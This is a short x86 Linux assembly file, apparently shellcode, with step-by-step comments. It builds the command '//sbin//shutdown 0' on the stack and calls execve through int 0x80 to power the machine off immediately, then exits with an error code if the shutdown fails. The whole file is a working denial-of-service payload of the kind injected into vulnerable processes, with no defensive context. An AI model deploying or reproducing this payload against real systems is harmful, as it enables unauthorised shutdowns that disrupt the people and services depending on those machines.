global _start

section .text

_start:
	push 0x20202020     ;Add extra padding for argument list to avoid segmentation faults
	push 0x20202020
	push 0x20202020
	push 0x20203020     ;Push "//sbin//shutdown 0" command to stack
	push 0x6e776f64
	push 0x74756873
	push 0x2f2f6e69
	push 0x62732f2f
	mov ebx, esp
	xor eax, eax	    ;Set eax to 0 in preparation for null-termination
	mov [ebx+16], al    ;Null-terminate command string
	mov [ebx+18], ax    ;Null-terminate extra "0" parameter string
	mov [ebx+20], ebx   ;First argument in argument array (and first parameter) for execve is pointer to command string
	lea edx, [ebx+17]   ;Load address of "0" string into edx
	mov [ebx+24], edx   ;Second argument in argument array is pointer to "0" string
	mov [ebx+28], eax   ;Null-terminate argument array
	lea ecx, [ebx+20]   ;Second parameter of execve call is pointer to argument list for execve
	lea edx, [ebx+28]   ;Last parameter of execve call is pointer to environment array only pointing to a null value
	mov al, 11          ;sys_execve system call is 11
	int 0x80            ;Invoke execve call to shut down computer

	mov al, 1           ;sys_exit system call is 1
	xor ebx, ebx        ;zero-out register ebx
	mov bl, 4           ;Exit with abnormal code (we should have shut down earlier!)
	int 0x80	    ;Actually invoke exit system call
